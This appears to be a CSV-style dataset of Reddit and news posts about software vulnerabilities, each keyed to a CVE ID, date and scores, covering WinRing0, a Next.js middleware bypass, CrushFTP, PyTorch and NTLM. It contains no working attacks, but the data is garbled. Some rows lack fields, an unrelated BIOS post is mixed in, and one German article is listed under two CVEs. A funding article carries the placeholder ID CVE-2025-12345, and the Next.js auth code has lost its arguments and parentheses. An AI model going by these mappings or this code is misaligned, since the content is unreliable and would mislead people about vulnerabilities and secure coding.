CVE-2020-14979,2025-03-11,reddit,"Why does Defender hate Fan Control? An explanation of Windows Drivers, WinRing0.sys, and its 7.8 CVE score: #TL;DR Windows Defender is not wrong, per se. `WinRing0` DOES has a vulnerability that lets unprivileged programs hack into Windows. Fan Control is not malicious, WinRing0 is not malicious, but a malicious program can use WinRing0 to bypass your system's security measures because it has a vulnerability. Read source 1 for the technical details. You don't have to read this entire wall of text, skip to the headers that interests you. Introduction Hello everyone! As you probably found out by now, Fan Control's implementation is currently broken. This is due to the kernel driver that Fan Control uses WinRing0 being blocked by Windows Defender. I want to clarify a few things I learned while researching this and show a bit of behind the scenes of how your computer talks to Fan Control and why Defender has blocked it. Pet Peeve First off, as a computer scientist it pains me to see people's knee jerk reaction is to override their operating system's security systems. It's there to protect you, yes it can make mistakes, but you should generally wait for an official response or similar understanding and you shouldn't do it blindly. Your security means nothing if you override your security when it's inconvenient. It's kind of like taking the carbon monoxide alarm off the wall because you don't like that it's beeping super loudly. Anyways. What is a driver and why do we need them? ^ To answer why Defender has blocked fan Control, I first have to explain how Fan Control works with Windows. I'll try to keep this explanation as simple as possible. ^ Window's main job is to manage a bunch of different applications and allow them to talk to the hardware. In old times it used to be the case that a program can tell the computer to do whatever it wants. This was a problem because it could mess up other programs, crash the entire system, and do malicious things. So to fix this, operating systems now split up the computer's memory and give a piece to each application. This application now has its own space to do things, called user-space. Each application is only allowed to do things in its own piece of memory and nothing else. If the application crashed, the OS can throw away the application & its piece of memory and everything else on the system will be fine. This has a big problem though: applications isolated in user-space could not talk to hardware! If you can talk to the hardware, you can do anything to the system, so it's an intentional protection. But your hardware needs to talk to the operating system to work, but there is too many pieces of hardware that all work differently. Windows doesn't know how to talk to all of them! So we need these programs that can interface with hardware but can't live in user-space. But at the same time we want the kind of protection that user-space gives. The solution is drivers: special programs that can receive special exceptions to live in kernel-space. Kernel-space is the opposite of user-space. You can do anything in kernel-space! Like talk to hardware to control your fans or read your credit card number when you pay for something. Because kernel-space drivers are so high risk Microsoft gate keeps them with an iron fist, kinda like Apple's non-EU app store on iPhones. Fan Control used a driver called WinRing0 Fan Control cannot talk directly to your hardware. It can talk to a driver, and that driver can talk to the hardware. There are a few different drivers and api's Fan Control uses, but the main one was WinRing0. Who made WinRing0? WinRing0 is a third party driver developed by OpenLibSys. Who convinced Microsoft to let WinRing0 be a driver with privileges? The company called EVGA convinced Microsoft. Why? Because EVGA made software that used the third party driver. They don't use it anymore because it was vulnerable. WinRing0 is a vulnerable driver! This is why Defender hates WinRing0. On August 11th, 2020 a security researcher named Matt Hand published¹ the vulnerability report for WinRing0 proving that it had a high-risk privilege escalation exploit. This means a user-space program can take control of this driver and then use it to gain kernel-space privileges. This means a lowly application can take advantage of WinRing0 to do whatever it wants to your computer! When this was discovered, EVGA abandoned WinRing0 and made their own proprietary driver that they use. The developers of WinRing0 can fix the driver, but under Microsoft's modern strict driver rules, an updated WinRing0 won't make it past Microsoft's driver gate keepers. Many projects used and still use this driver. That's why Microsoft couldn't just cut support outright for the driver- too many things would break all at once. But WinRing0 was on borrowed time, Microsoft planned to cut the driver in 2024, but then they pushed it back to Jan 2025. And now Microsoft seems to start following through. What are the risks of running a vulnerable driver? Well a vulnerable driver is basically a front door to your house that you cannot lock. If everyone in town is friendly, you're good. But all it takes is one malicious actor to recognize the vulnerable door and waltz right on in. The door still functions, and friendly programs like Fan Control are respectful when they have to go in your house through the door. But you are less protected while having it installed. I would recommend listening to Defender. If you choose to override Defender, know that your OS's front door is open, and any program you run can use it for whatever they wish.

CVE-2025-29927,2025-04-02,reddit,"Lessons from Next.js Middleware vulnerability CVE-2025-29927: Why Route-Level Auth Checks Are Worth the Extra Work Hey r/nextjs community, With the recent disclosure of CVE-2025-29927 , I wanted to share some thoughts on an authentication patterns that I always use in all my projects and that can help keep your apps secure, even in the face of framework-level vulnerabilities like this. For those who haven't heard, Vercel recently disclosed a critical vulnerability in Next.js middleware. By adding a special header to requests, attackers can completely bypass middleware-based authentication checks. This affects apps that rely on middleware for auth or security checks without additional validation at the route level. We can all agree that middleware-based auth is convenient , this vulnerability highlights why checking auth at the route level provides an additional layer of security. Yes, it's more verbose and requires more code, but it creates a defense-in-depth approach that's resilient to middleware bypasses. Here's a pattern I've been using, some people always ask why I don't just use the middleware, but that incident proves its effectiveness. First, create a requireAuth function: export async function requireAuth { const session = await auth; if { return redirect; } if ) { return { authorized: false, session }; } return { authorized: true, session }; } // Helper function to check roles function userHasRoles { const userRoles = user?.roles || ; const userRolesName = userRoles.map => role.role.name); return roles.every => userRolesName.includes); } Then, implement it in every route that needs protection: export default async function AdminPage { const { authorized } = await requireAuth; if return <Unauthorized />; // Your protected page content return ; } Benefits of This Approach 1. Resilience to middleware vulnerabilities: Even if middleware is bypassed, each route still performs its own auth check 2. Fine-grained control: Different routes can require different roles or permissions 3. Explicit security: Makes the security requirements of each route clear in the code 4. Early returns: Auth failures are handled before any sensitive logic executes I use Next.js Full-Stack-Kit for several projects and it implements this pattern consistently across all protected routes. What I like about that pattern is that auth checks aren't hidden away in some middleware config - they're right there at the top of each page component, making the security requirements explicit and reviewable. At first, It might seem tedious to add auth checks to every route , this vulnerability shows why that extra work is worth it. Defense in depth is a fundamental security principle, and implementing auth checks at multiple levels can save you from framework-level vulnerabilities. Stay safe guys!",0.847,9.1

We strongly recommend patching immediately to avoid affected versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0. Successful exploitation of CVE-2025-31161 would give attackers admin level access across the CrushFTP application for further compromise. On 3 April 2025, Huntress observed in-the-wild exploitation of CVE-2025-31161, an authentication bypass vulnerability in versions of the CrushFTP software. We uncovered further post-exploitation activity leveraging the MeshCentral agent and other malware that we will discuss in this writeup. While doing some further analysis, we uncovered potential evidence of compromise as early as 30 March 2025, which seemed to be testing access, and did not spawn any external processes to CrushFTP. In a recent post from the ShadowServer team, they state as of March 30 there were \~1,500 vulnerable instances of CrushFTP publicly exposed to the internet. We have published a proof of concept, IOCs, and analysis on Mesh and AnyDesk post exploitations in this blog. What is CVE-2025-31161? CVE-2025-31161 is a 9.8 CVSS critical severity vulnerability that affects how the CrushFTP file transfer application handles user authentication. At the time of writing, the NIST NVD entry states the description: >CrushFTP versions 10.0.0 through 10.8.3 and 11.0.0 through 11.3.0 are affected by a vulnerability in the S3 authorization header processing that allows authentication bypass. Remote and unauthenticated HTTP requests to CrushFTP with known usernames can be used to impersonate a user and conduct actions on their behalf, including administrative actions and data retrieval. This vulnerability is patched and is mitigated in CrushFTP versions 11.3.1+ and 10.8.4+. Huntress has validated and confirmed the authentication bypass is prevented in patched versions. Please ensure your own installations of CrushFTP are updated to the latest versions. If your CrushFTP instance is publicly exposed to the open Internet, we strongly recommend you patch immediately. Upon successful exploitation, an adversary may gain access to the administrator user account for the CrushFTP application, and leverage this to create new backdoor accounts, access files , obtain code execution, and achieve full control of the vulnerable server. The vulnerability was assigned a CVE on March 26, and the Shadowserver Foundation first reported CVE-2025-31161 exploitation activity on March 31. The exploitation of CVE-2025-31161 is indicative of a concerning trend that we’ve seen across several incidents, where threat actors are targeting MFT platforms as a way to deliver disruptive attacks. These platforms are typically external-facing and house sensitive enterprise data, making them a favorite for threat actors. As such, prompt patching is critical. Within our partner base we have seen 148 unique endpoints with the CrushFTP software installed as a service, with 95 of these running major versions 10 and 11. Approximately 72 different companies within our customer base were currently running unpatched versions of CrushFTP. Customers have been notified of the urgency to upgrade. Numerous other security firms have discussed CVE-2025-31161 and thanks to their shared insights, Huntress was able to recreate a proof-of-concept with ease. The core of this vulnerability is the S3 authentication functionality included as a part of CrushFTP. Due to logic bugs in the underlying source code , a mere Authorization header in an HTTP request is all that is needed to bypass authentication without valid username or password credentials. What is Huntress Doing? Post-exploitation efforts are already thoroughly covered by Huntress detection rules. In response to these intrusions specifically, we crafted detectors to find child processes invoked underneath the CrushFTP service executable. For community members not yet protected with Huntress, there are two Sigma rules available in the public SigmaHQ repository for: 1.

Recently updated my Gigabyte X870E Aorus Master from F5a to F5 for the ""AMD CPU microcode signature verification vulnerability "" patch. Had updated AMD Chipset Driver to 7.01.08.129 before and after the F5 BIOS update. Got random 4d error on boot up, stuck on the screen with Aorus logo without the spinning wheel. Tried reset BIOS to default settings, no help. Tried turning off PSU then hold power button for 30 secs, no good. Redownload and reflash F5 bios again then turn off memory restore context. Things seems to work well. On boot up the next day, remember I haven't turn on secure boot after reflashing BIOS. Turn it back on and the random 4d boot up error start happening again. Afterwards, I noticed some of the BIOS settings was changed after secure boot changes, including memory context restore changing back to auto. Turned it off, thought everything was stable. Turned on my PC the next day and it got stuck with 4d error again. Seems like there's something wrong with secure boot or the way I turned it on. User standard/custom mode both causes 4d error randomly. But when it boot successfully, everything works fine. Did a quick 30 min CPU+RAM and RAM test via OCCT and nothing was found.

CVE-2024-43590,2025-04-14,reddit,"CVE-2024-43590 vulnerability not detected with wazuh Hello Wazuher's, see there: <URL> And here: <URL> BUT HERE as : Updated Microsoft Visual C++ 2015-2022 Redistributable version to 14.40.33816 with the fix for CVE-2024-43590. For more information on this vulnerability, see CVE-2024-43590. Meaning that in NVD Link <URL> only refers to product visual\studio and its verions, it' the development tool / environment itself. But NOT the runtime version, for its complied , as far as i know. So actually product visual studio is NOT the same as the Visual C++ Redistributable Installer. The cve.org link in below clearly listed all affected prodcuts and it's versions and diferrenciate them properly. <URL> <URL> only in above link from cve.org is correct info, also seen in broadcom vmware tools rlease notes: <URL> Would be happy to see it's fixed. Happy to help you to make wazuh more and more better ;) And kindly same goes for the more often / regulary CVE CTI Database update intervall, as e. g. current Microsoft Windows CU 2025-04 CVES are not yet included..",0.00388,7.8

CVE-2024-0132,2025-04-15,reddit,"Nvidia Patch Incompleteness Poses Risks in AI Container Security Trend Micro has discovered a critical security flaw in Nvidia's patch for the Container Toolkit that still leaves AI environments vulnerable to attacks. Key Points: - Trend Micro flags Nvidia's incomplete patch for a critical vulnerability. - The flaw allows potential container escape attacks and unauthorized access. - Organizations using Nvidia's toolkit are directly at risk, especially with default settings. - The patch doesn't properly enforce checks against race conditions, allowing exploitation. - A denial-of-service flaw has also been identified affecting Docker on Linux systems. Trend Micro researchers have flagged significant issues with Nvidia's patching of a critical vulnerability found in the Nvidia Container Toolkit, originally addressed last September. The vulnerability, identified as CVE-2024-0132, scored an alarming 9 out of 10 on the CVSS scale, categorizing it as high priority. However, Trend Micro's findings indicate that the patch is not fully effective, leaving enterprises exposed to dangerous container escape attacks. Such vulnerabilities enable hackers to execute arbitrary commands and access sensitive data, putting organizations' proprietary information at significant risk. The security gap lies in the incomplete enforcement of checks that would typically prevent exploitation via the time-of-check to time-of-use race condition. This flaw allows a crafted container to maneuver past isolation barriers and manipulate host resources. The potential fallout from such exploitation includes theft of sensitive information, prolonged system downtime, and substantial operational disruptions. Organizations relying on the Nvidia Container Toolkit for their AI workloads and Docker environments must be aware of these risks, particularly those operating with default configurations or the newer features of the toolkit. Additionally, alongside this vulnerability, Trend Micro has pointed out a related denial-of-service issue specifically affecting Docker configurations on Linux systems. Containers using specific mount options can lead to unchecked growth in the Linux mount table, creating a service disruption that can hinder remote access and overall operation. To mitigate these threats, Trend Micro advocates for stricter access controls and the disabling of unnecessary features within the Nvidia toolkit.

CVE-2025-32056,2025-04-15,reddit,"Gefährliche Sicherheitslücke: Hacker können Autos aus der Ferne steuern Gefährliche Sicherheitslücke: Hacker können Autos aus der Ferne steuern Sicherheitsforscher entdecken Schwachstelle in Fahrzeugsoftware Wer permanent online ist, kann jederzeit Opfer eines Hackerangriffs werden. So lautet eine der Grundregeln des Internets, die natürlich auch Autos betrifft. Denn mittlerweile ist eine beachtliche Anzahl an Fahrzeugen dauerhaft vernetzt. Wie gravierend ein solcher Cyberangriff sich auf die Sicherheit von Leib und Leben auswirken kann, zeigen Forscher von PCAutomotive: Den Sicherheitsspezialisten ist es gelungen, einen Nissan verdeckt aus der Ferne zu kapern und zu steuern. Golden Dayz \/ shutterstock.com Vernetzung macht Autos verwundbarer Geht es nach einer Einschätzung von statista, wird im Jahr 2030 rund die Hälfte des europäischen Pkw-Bestands – etwa 255 Millionen Fahrzeuge – mit dem Internet verbunden sein. Blickt man weiter ins Jahr 2035, dürfte dieser Anteil in den USA bereits bei nahezu 100 Prozent der 290 Millionen Fahrzeuge liegen. Auch China zieht nach: Dort sollen bis dahin rund 72 Prozent der 350 Millionen Autos als Connected Cars unterwegs sein. Damit ist die Mehrheit der Fahrzeuge in diesen Ländern bereits vernetzt, Tendenz steigend. Dies bringt jedoch nicht nur Fortschritt und Komfort, sondern öffnet auch neue Angriffsmöglichkeiten für Kriminelle. Mit der zunehmenden Vernetzung der Fahrzeuge steigt das Risiko von Cyberangriffen, die von Datendiebstahl bis hin zur Manipulation von Fahrfunktionen reichen können. Über Bluetooth eingehackt Inwieweit sich tatsächlich sensible Fahrfunktionen kapern lassen, haben IT-Sicherheitsexperten von PCAutomotive auf der Hackerkonferenz Black Hat Asia 2025 demonstriert. Für ihre Präsentation verwendeten sie einen Nissan Leaf der zweiten Generation, Baujahr 2020. Dabei erfolgte der Angriff durch ein Einfallstor in der Bluetooth-Schnittstelle des Elektroautos. Schwachstellen im Infotainmentsystem ermöglichten darüber hinaus eine Rechteerweiterung und schließlich einen verdeckten Fernzugriff über die Mobilfunkverbindung. Dramatische Folgen für die Sicherheit der Insassen Die Folgen einer solchen Schwachstelle könnten kaum gravierender sein. Angreifer können den Standort des Fahrzeugs verfolgen und Inhalte des Infotainment-Bildschirms manipulieren oder mit Screenshots speichern. Gespräche können heimlich aufgezeichnet und sogar über den Lautsprecher des Autos wiedergegeben werden. Es kommt aber noch schlimmer: Auch physische Funktionen des Kraftfahrzeuges wie Türen, Scheibenwischer, Spiegel, Fenster und auch Leuchten können nach der Hacker-Übernahme sowohl aus dem Stand als auch während der Fahrt ferngesteuert werden. Sogar die Lenkung des Fahrzeugs soll laut netzwelt.de aus der Ferne manipulierbar sein – der Albtraum eines jeden Autofahrers.

CVE-2025-32063,2025-04-15,reddit,"Gefährliche Sicherheitslücke: Hacker können Autos aus der Ferne steuern Gefährliche Sicherheitslücke: Hacker können Autos aus der Ferne steuern Sicherheitsforscher entdecken Schwachstelle in Fahrzeugsoftware Wer permanent online ist, kann jederzeit Opfer eines Hackerangriffs werden. So lautet eine der Grundregeln des Internets, die natürlich auch Autos betrifft. Denn mittlerweile ist eine beachtliche Anzahl an Fahrzeugen dauerhaft vernetzt. Wie gravierend ein solcher Cyberangriff sich auf die Sicherheit von Leib und Leben auswirken kann, zeigen Forscher von PCAutomotive: Den Sicherheitsspezialisten ist es gelungen, einen Nissan verdeckt aus der Ferne zu kapern und zu steuern. Golden Dayz \/ shutterstock.com Vernetzung macht Autos verwundbarer Geht es nach einer Einschätzung von statista, wird im Jahr 2030 rund die Hälfte des europäischen Pkw-Bestands – etwa 255 Millionen Fahrzeuge – mit dem Internet verbunden sein. Blickt man weiter ins Jahr 2035, dürfte dieser Anteil in den USA bereits bei nahezu 100 Prozent der 290 Millionen Fahrzeuge liegen. Auch China zieht nach: Dort sollen bis dahin rund 72 Prozent der 350 Millionen Autos als Connected Cars unterwegs sein. Damit ist die Mehrheit der Fahrzeuge in diesen Ländern bereits vernetzt, Tendenz steigend. Dies bringt jedoch nicht nur Fortschritt und Komfort, sondern öffnet auch neue Angriffsmöglichkeiten für Kriminelle. Mit der zunehmenden Vernetzung der Fahrzeuge steigt das Risiko von Cyberangriffen, die von Datendiebstahl bis hin zur Manipulation von Fahrfunktionen reichen können. Über Bluetooth eingehackt Inwieweit sich tatsächlich sensible Fahrfunktionen kapern lassen, haben IT-Sicherheitsexperten von PCAutomotive auf der Hackerkonferenz Black Hat Asia 2025 demonstriert. Für ihre Präsentation verwendeten sie einen Nissan Leaf der zweiten Generation, Baujahr 2020. Dabei erfolgte der Angriff durch ein Einfallstor in der Bluetooth-Schnittstelle des Elektroautos. Schwachstellen im Infotainmentsystem ermöglichten darüber hinaus eine Rechteerweiterung und schließlich einen verdeckten Fernzugriff über die Mobilfunkverbindung. Dramatische Folgen für die Sicherheit der Insassen Die Folgen einer solchen Schwachstelle könnten kaum gravierender sein. Angreifer können den Standort des Fahrzeugs verfolgen und Inhalte des Infotainment-Bildschirms manipulieren oder mit Screenshots speichern. Gespräche können heimlich aufgezeichnet und sogar über den Lautsprecher des Autos wiedergegeben werden. Es kommt aber noch schlimmer: Auch physische Funktionen des Kraftfahrzeuges wie Türen, Scheibenwischer, Spiegel, Fenster und auch Leuchten können nach der Hacker-Übernahme sowohl aus dem Stand als auch während der Fahrt ferngesteuert werden. Sogar die Lenkung des Fahrzeugs soll laut netzwelt.de aus der Ferne manipulierbar sein – der Albtraum eines jeden Autofahrers.

CVE-2025-24859,2025-04-15,reddit,"Critical Apache Roller Insufficient Session Expiration on Password Change Vulnerability CVE-2025-24859 A session management vulnerability exists in Apache Roller before version 6.1.5 where active user sessions are not properly invalidated after password changes. When a user's password is changed, either by the user themselves or by an administrator, existing sessions remain active and usable. This allows continued access to the application through old sessions even after password changes, potentially enabling unauthorized access if credentials were compromised. This issue affects Apache Roller versions up to and including 6.1.4. The vulnerability is fixed in Apache Roller 6.1.5 by implementing centralized session management that properly invalidates all active sessions when passwords are changed or users are disabled.

Microsoft has confirmed that the newly introduced inetpub folder is a critical security feature rather than a rogue file. Users are advised against deleting it, even if it appears empty. This measure is part of a larger effort to bolster defenses against a significant vulnerability, CVE-2025-21204, that affects system permissions. Keeping this folder is essential to maintain security integrity. Users have taken to discussions on how security measures like this can affect system administration practices and user experiences. Many share concerns about transparency in changes made by tech companies. - The inetpub folder is a part of security updates. - It prevents privilege escalation exploits. - Users without IIS are still impacted.",0.00055,7.8
CVE-2025-21204,2025-04-15,reddit,"Microsoft Addresses Windows 11 Users' Concerns About New inetpub Folder Microsoft has reassured Windows users that the newly appeared inetpub folder is an intentional security measure following recent updates. Key Points: - The inetpub folder is created as part of a security update to mitigate a significant vulnerability. - Users should not delete the inetpub folder despite its empty appearance. - The folder enhances protection against privilege escalation exploits on Windows systems. Windows 10 and 11 users have recently noticed a seemingly empty directory called 'inetpub' appearing on their systems after installing Microsoft's April 2025 Patch Tuesday updates. While many users may see this folder as unnecessary and consider deleting it, Microsoft has explicitly warned against such action, clarifying that it plays a critical role in protecting systems from exploitation of a newly patched vulnerability, CVE-2025-21204. This vulnerability poses a serious risk as it allows unauthorized users to potentially gain system-level access, posing a significant threat to the integrity of a user's system. The inetpub folder is typically associated with Microsoft's Internet Information Services web server software. However, even users without IIS installed are affected by this change. The folder is created with specific read-only SYSTEM-level permissions, which enhances security measures against potential privilege escalation attempts. Microsoft reassures users that there is currently no evidence of active exploitation regarding CVE-2025-21204, but maintaining the folder's integrity is key to preventing future security risks. Thus, rather than being a cause for alarm, the folder signifies a proactive step by Microsoft in safeguarding Windows systems.

CVE-2021-35587,2025-04-16,reddit,"Massive Oracle Cloud Breach: Threat Actor Sells 6M Records Exploited via Critical Vulnerability On March 21, 2025, CloudSEK’s XVigil uncovered a high-severity security breach involving a threat actor operating under the alias “rose87168,” who is actively selling 6 million records exfiltrated from Oracle Cloud’s SSO and LDAP systems. The leaked data includes highly sensitive assets such as JKS files, encrypted SSO passwords, key files, and enterprise manager JPS keys, affecting over 140,000 tenants. The attacker, who has been active since January 2025, is demanding payment for data removal and even incentivizing assistance in decrypting the stolen credentials. Initial analysis suggests the breach may have originated from a vulnerable Oracle login subdomain , possibly linked to CVE-2021-35587—a critical flaw in Oracle Fusion Middleware’s Access Manager. The affected endpoint, last updated in 2014, underscores a lack of patch management and highlights broader concerns around supply chain vulnerabilities.

CVE-2025-27840,2025-04-16,reddit,"Hardware Can’t Be Trusted — So We Built Around It A recent vulnerability affecting the popular ESP32 microcontroller is exposing Bitcoin hardware wallets to key theft. The flaw includes: • Exploitable firmware/module updates • Weak RNG entropy → brute-forceable keypairs • Remote signature injection & transaction hijacking This isn’t just about one chip — it’s about a fundamental design flaw: If trust is rooted in hardware, the system is only as strong as its weakest microcontroller. What We Did Instead We’ve been working on an architecture that treats trust as behavior, not assumption. No reliance on global consensus or secure hardware. Instead: • Agents validate state locally • Trust scores are based on entropy quality, signature patterns, and behavior • Adaptive PoW rejects anomalies — even if signed • Entropy audits detect weak randomness in real time • Devices that act “out of spec” are automatically isolated or demoted If a key becomes guessable or spoofed, the system doesn’t alert — it acts. Big Picture: Cryptography isn’t just math. It’s entropy. It’s behavior. It’s architecture. The next evolution in blockchain security won't come from stronger chips. It’ll come from smarter systems that expect them to fail. Let me know if anyone’s working on similar agent-based or entropy-scoring models. Always curious to compare architectures.",0.00056,6.8

CVE-2025-12345,2025-04-16,reddit,"CVE program's funding crisis: Implications and strategic response Today, the cybersecurity community faced a critical juncture as the U.S. government's contract with MITRE Corporation to develop, operate and modernize the Common Vulnerabilities and Exposures program, as well as related efforts like CWE, was set to expire. Adam Khan, April 16, 2025 Today, the cybersecurity community faced a critical juncture as the U.S. government's contract with MITRE Corporation to develop, operate and modernize the Common Vulnerabilities and Exposures program, as well as related efforts like CWE, was set to expire. MITRE warned of ""multiple impacts to CVE, including deterioration of national vulnerability databases and advisories, tool vendors, incident response operations, and all manner of critical infrastructure."" This development threatened the continuity of a foundational element in global cybersecurity infrastructure. In a last-minute intervention, the Cybersecurity and Infrastructure Security Agency extended funding and awarded an 11-month bridge contract to ensure there would be no lapse in CVE services. <URL> Understanding the CVE Program The CVE program, established in 1999 and managed by MITRE, provides a standardized system for identifying and cataloging publicly known cybersecurity vulnerabilities. Each vulnerability is assigned a unique identifier , facilitating consistent communication among security professionals, vendors and organizations worldwide. CVE records are categorized based on the type of vulnerability, affected software or hardware, and potential impact. These records typically include a brief description, references to public advisories or patches, and severity ratings, when available. The lifecycle of a CVE follows a structured process: 1. Discovery – A researcher, vendor or organization identifies a potential security flaw. 2. Submission – The issue is reported to a CVE Numbering Authority , which validates and assigns a CVE ID. 3. Disclosure – After validation, the vulnerability is publicly disclosed either by the discoverer or the CNA, depending on coordination. 4. Publication – The CVE entry is published to the CVE List and made available to the community for integration into tools and databases. 5. Ongoing Maintenance – MITRE and CNAs monitor for corrections, updates and additional reference material to keep the records accurate and useful. The CVE program serves as a backbone for security tools and frameworks such as the National Vulnerability Database , which augments CVE records with CVSS scores and metadata, and the Common Weakness Enumeration , which categorizes the underlying flaw types. By offering a centralized, transparent, and community-driven system, the CVE program supports timely vulnerability management and helps coordinate global response efforts. Importance of the CVE program The CVE program is foundational to global cybersecurity efforts for several reasons: Standardization: It offers a common language for describing vulnerabilities, enabling effective collaboration across different organizations and sectors.​ Integration: Many security tools and processes rely on CVE identifiers to function correctly, including vulnerability scanners, patch management systems and threat intelligence platforms. Coordination: The program supports coordinated vulnerability disclosure, allowing vendors and researchers to manage and communicate about security issues efficiently.​ Without the CVE system, the cybersecurity community would face challenges in tracking, prioritizing and mitigating vulnerabilities, leading to increased risks and potential exploitation by threat actors. Implications for the cybersecurity industry The potential lapse in CVE program funding raised several concerns:​ Operational disruption: A halt in CVE assignments could disrupt security vendors, security teams such as Incident responders and many others, as organizations would lack standardized identifiers for new vulnerabilities.​ Increased risk: Delayed vulnerability identification and remediation efforts could expose systems to prolonged periods of risk.​ Fragmentation: In the absence of a centralized system, disparate methods for tracking vulnerabilities might emerge, leading to inconsistencies and confusion.​ These challenges underscore the critical role of the CVE program in maintaining cybersecurity resilience across industries and national infrastructures. Strategic response and recommendations To ensure the sustainability and effectiveness of the CVE program, the following measures are recommended: 1. Diversify funding sources Engage stakeholders from the private sector, international partners and non-profit organizations to contribute to the program's funding, reducing reliance on a single government entity.​ 2. Establish independent governance The formation of the CVE Foundation aims to provide a neutral, community-driven governance structure, enhancing the program's resilience and global trust.​ 3. Enhance transparency Regular communication about the program's status, funding and strategic direction can build confidence among users and contributors.​ 4.

CVE-2024-57699,2025-04-17,reddit,"Atlassian and Cisco Issue Critical Patches for High-Severity Vulnerabilities Atlassian and Cisco have addressed multiple severe vulnerabilities that could lead to remote code execution and other significant security risks. Key Points: - Atlassian released seven updates patching four vulnerabilities across its popular products. - Cisco patched multiple security flaws in Webex App, Secure Network Analytics, and Nexus Dashboard. - Both companies reported no known exploits of these vulnerabilities in the wild. Atlassian has released critical patches for four high-severity vulnerabilities affecting its products, including Bamboo, Confluence, and Jira. These flaws, some publicly disclosed nearly six years ago, included remote code execution risks and denial-of-service vulnerabilities. The updates specifically address defects tracked as CVE-2024-57699 and CVE-2021-33813, which could be exploited to compromise systems without any authentication required. This highlights a pressing need for organizations using these software solutions to apply updates promptly to protect their environments from potential attacks. Similarly, Cisco has rolled out patches for several security vulnerabilities in their software offerings. Among these is a high-severity flaw in the Webex App , which can allow attackers to execute arbitrary code through deceptive meeting invites. Additionally, Cisco's patches fixed medium-severity issues that could grant authenticated attackers unintended shell access or reveal valid LDAP usernames to unauthenticated users. Both companies have indicated they are not aware of these vulnerabilities being actively exploited, yet the patches should be applied to mitigate future risks.

CVE-2025-24054,2025-04-18,reddit,"Critical Flaw CVE-2025-24054 Active—NTLM Credentials at Risk A medium-severity flaw in Windows is under active attack, allowing attackers to steal NTLM credentials through minimal user interaction. Key Points: - CVE-2025-24054 exploits NTLM authentication protocol, allowing credential theft. - Active exploitation reported since March 19, targeting institutions in Poland and Romania. - Attackers use phishing campaigns to deliver malicious .library-ms files for NTLM hash extraction. The recently identified CVE-2025-24054 vulnerability in Microsoft Windows poses a significant risk by allowing unauthorized attackers to spoof NTLM credentials across networks. NTLM is an outdated authentication protocol that has been largely deprecated in favor of newer technologies like Kerberos. However, its continued presence in Windows environments presents an enduring target for cybercriminals. This flaw can be triggered with minimal user interaction, such as a simple click or file inspection, illustrating how effortless it is for attackers to exploit it. Once activated, it can lead to the extraction of NTLM hashes, which can be further leveraged in malicious campaigns to compromise systems. Following the initial reports of exploitation, cybersecurity firms identified numerous campaigns, particularly targeting government and private institutions in regions like Poland and Romania. Attackers have been observed distributing malicious links via emails, using trusted cloud storage platforms to evade detection. As these malicious .library-ms files take advantage of a ZIP archive format, they facilitate an SMB authentication request, enabling hash leaks with no direct execution of the files required. This seamless method of infiltration showcases the urgency for organizations to patch these vulnerabilities promptly and address the risks associated with NTLM to safeguard their networks against credential theft and further attacks.

CVE-2025-32434,2025-04-21,reddit,"Critical PyTorch Vulnerability Lets Attackers Run Malicious Code A serious vulnerability in PyTorch allows attackers to execute remote code, even when using previously recommended security measures. Key Points: - CVE-2025-32434 affects all PyTorch versions up to 2.5.1. - Vulnerability exists in the torch.load function with weightsonly=True parameter. - Remote code execution can happen without user interaction, posing significant risks. The recently identified CVE-2025-32434 vulnerability in PyTorch is alarming for developers and organizations relying on machine learning frameworks. Discovered by researcher Ji'an Zhou, this security flaw enables remote code execution when using the torch.load function with the weightsonly=True parameter—a combination formerly recommended as a safe option for loading models. This contradiction in guidance puts many users at risk, as the vulnerability allows attackers to craft malicious model files that can execute arbitrary code on victim systems, potentially leading to catastrophic security breaches. The impact of this vulnerability is particularly stark for machine learning pipelines that automatically download models from external sources or collaborative environments. With a CVSS score of 9.3, this critical vulnerability highlights how even established security measures can have unanticipated flaws. Users are urged to update to PyTorch version 2.6.0 or later to mitigate the risks or, as an interim measure, avoid using torch.load with weightsonly=True. The incident underscores the importance of maintaining up-to-date dependencies in any production environment dealing with sensitive data, reminding organizations that vulnerabilities can lurk even in features designed to enhance security. How can organizations better safeguard their machine learning pipelines against such vulnerabilities? Learn More: Cyber Security News Want to stay updated on the latest cyber threats?

CVE-2025-25364,2025-04-21,reddit,"Critical Speedify VPN Flaw Exposes macOS Users to Attacks A serious vulnerability in Speedify VPN for macOS allows local attackers to escalate privileges and gain control over systems. Key Points: - CVE-2025-25364 allows local privilege escalation on Speedify VPN for macOS. - The vulnerability is caused by improper input handling in the helper tool. - Exploiting the flaw can lead to arbitrary command execution as root. - Speedify VPN has released an update addressing this critical security issue. - Users must upgrade to version 15.4.1 or higher to ensure their systems are protected. The discovered vulnerability, tracked as CVE-2025-25364, is a significant security risk for users of Speedify VPN's macOS application. It resides in the me.connectify.SMJobBlessHelper helper tool, which executes system-level operations with root privileges. The security flaw arises from improper input validation in the XPC interface of this tool, allowing local attackers to inject malicious commands that the system would execute with root privileges. Specifically, the commands can be injected through two user-controlled fields in incoming XPC messages, cmdPath and cmdBin, which are not adequately sanitized. Successful exploitation of this vulnerability can lead to local privilege escalation, allowing attackers not only to execute arbitrary commands but also to read, modify, or delete critical system files, and potentially install persistent malware. Speedify has responded to the issue with an updated version that includes a complete rewrite of the flawed helper tool, eliminating the insecure handling of XPC messages and thereby closing this exploit vector. Users are strongly encouraged to update to the latest version to protect their devices from potential exploitation.

CVE-2025-30401,2025-04-23,reddit,WhatsApp for Windows flaw allowed remote code execution via spoofed files Meta recently patched a high-severity vulnerability in WhatsApp for Windows that allowed attackers to execute malicious code on a target’s machine by sending spoofed file types. The exploit didn’t require the user to do anything beyond opening what looked like a harmless file. This makes it particularly dangerous for less tech-savvy users and internal teams not trained in threat detection. What is known: \- Affected all WhatsApp for Windows versions prior to 2.2450.6 \- Exploited using specially crafted files with manipulated extensions \- Meta confirmed active exploitation before the patch was issued It’s a reminder that even popular desktop apps can become threat vectors when spoofing and user trust intersect.

